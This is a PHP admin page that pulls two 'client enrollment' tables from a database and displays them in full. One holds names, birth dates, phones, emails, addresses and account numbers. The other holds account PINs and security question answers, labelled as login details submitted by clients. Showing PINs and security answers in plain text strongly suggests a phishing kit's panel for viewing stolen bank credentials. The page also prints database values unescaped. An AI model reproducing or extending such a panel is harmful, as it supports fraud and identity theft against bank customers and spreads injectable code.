 
  <?php
	 
        session_start();

	error_reporting(0);
	require('../admin-config.php');
	
  ?>
  
  

 



<div class="container-fluid">
          <div class="row">
            <div class="col-md-8">
              
              
              
              
              
                      <div class="card">
                <div class="card-header card-header-primary">
                  <h4 class="card-title">Client Enrollment from the site front End</h4>
                  <p class="card-category">Please carefully observer the First Form (Step 3 Form)</p>
                </div>
                <div class="card-body">
                   
                   <?php
			  
				$query=mysqli_query($conn,"SELECT * FROM `enrollment` ORDER BY `id` DESC");
				
				echo '<table align="center" border="1px" cellpadding="5px" cellspacing="5px">';
				echo '<caption class=""><br>';
				echo '<tr class="list-head">
				<th>USERID</th>
				<th>Account NO</th>
				<th>Title</th>
				<th>Name</th>
				<th>day</th>
				<th>month</th>
				<th>Year</th>
				<th>Tel Code</th>
				<th>Phone</th>
				<th>Email</th>
				<th>Address</th>
				<th>Post Code</th>
				<th>Country</th>
				<th>Date of Reg</th>
				
				
				
				</tr>';
				while($active=mysqli_fetch_array($query)){
					echo '<tr class="list-detail">
					
					<td>'.$active['id'].'</td>
					<td>'.$active['acct'].'</td> 
					<td>'.$active['title'].'</td>
					<td>'.$active['name'].'</td>
					<td>'.$active['dobd'].'</td>
					<td>'.$active['dobm'].'</td>
					<td>'.$active['doby'].'</td>
					<td>'.$active['telcode'].'</td>
					<td>'.$active['phone'].'</td>
					<td>'.$active['email'].'</td>
					<td>'.$active['address'].'</td>
					<td>'.$active['postcode'].'</td>
					<td>'.$active['country'].'</td>
					<td>'.$active['enrolldate'].'</td>
					
					
					
					
					
					</tr>';
				}
				echo '</table>';
			  ?>
					
                   
                   	 
         
                </div>
              </div>
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              
              <div class="card">
                <div class="card-header card-header-primary">
                  <h4 class="card-title">Client Enrollment Step 5</h4>
                  <p class="card-category">Login Details as submitted by the client</p>
                </div>
                <div class="card-body">
                   
                   		<?php
			  
				$query=mysqli_query($conn,"SELECT * FROM `enrollment2` ORDER BY `id` DESC");
				
				echo '<table align="center" border="1px" cellpadding="5px" cellspacing="5px">';
				echo '<caption class=""><br>';
				echo '<tr class="list-head">
				<th>USERID</th>
				<th>A/C NO</th>
				<th>A/C PIN</th>
				<th>Email Address</th>
				<th>Question 1</th>
				<th>Answer 1</th>
				<th>Question 2</th>
				<th>Answer 2</th>
				<th>Date of Reg</th>
				
				
				</tr>';
				while($active=mysqli_fetch_array($query)){
					echo '<tr class="list-detail">
					
					<td>'.$active['id'].'</td>
					<td>'.$active['accno'].'</td>
					<td>'.$active['pin'].'</td>
					<td>'.$active['email'].'</td>
					<td>'.$active['q1'].'</td>
					<td>'.$active['ans1'].'</td>
					<td>'.$active['q2'].'</td>
					<td>'.$active['ans2'].'</td>
					<td>'.$active['regdate'].'</td>
					
					
					
					
					
					</tr>';
				}
				echo '</table>';
			  ?>
                   
                   
         
                </div>
              </div>
            </div>
            
          </div>
        </div>
 


 



